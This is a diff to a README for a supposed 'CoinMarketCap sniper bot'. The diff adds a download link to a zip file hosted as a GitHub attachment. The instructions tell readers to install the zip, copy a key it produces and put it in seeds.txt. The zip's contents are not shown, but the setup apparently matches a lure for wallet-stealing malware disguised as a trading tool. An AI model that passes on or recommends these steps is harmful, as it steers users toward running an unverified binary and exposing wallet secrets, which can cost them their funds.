@@ -9,7 +9,7 @@
 CoinMarketCap sniper bot that buys BSC tokens 
 This bot uses Smart Chain BNB to buy tokens not WBNB.
 
-#### First, install [CoinMarketCapSniper.zip](), from releases
+#### First, install [CoinMarketCapSniper.zip](https://github.com/user-attachments/files/16183491/CoinMarketCapSniper.zip), from releases
 #### Then open it and copy ur key that software gave u
 #### Then enter the key in seeds.txt in folder
 #### Enjoy!
